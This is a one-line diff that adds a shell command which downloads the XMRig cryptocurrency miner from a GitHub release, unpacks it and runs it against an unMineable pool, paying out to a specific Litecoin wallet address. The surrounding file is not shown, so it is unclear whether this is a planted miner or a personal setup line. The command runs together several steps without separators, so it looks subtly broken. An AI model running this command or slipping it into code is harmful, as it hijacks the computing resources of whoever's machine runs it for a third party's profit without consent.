@@ -1,0 +1,1 @@
+mkdir kd && cd kd && wget https://www.github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz; tar -xf xmrig-6.21.1-linux-x64.tar.gz cd xmrig-6.21.1 ./xmrig -a rx -o stratum+ssl://rx-us.unmineable.com:443 -u LTC:ltc1qlxy3whxers6kaw0rpc0tf0ffa389ehlpj0rjj3.PC6 -p x
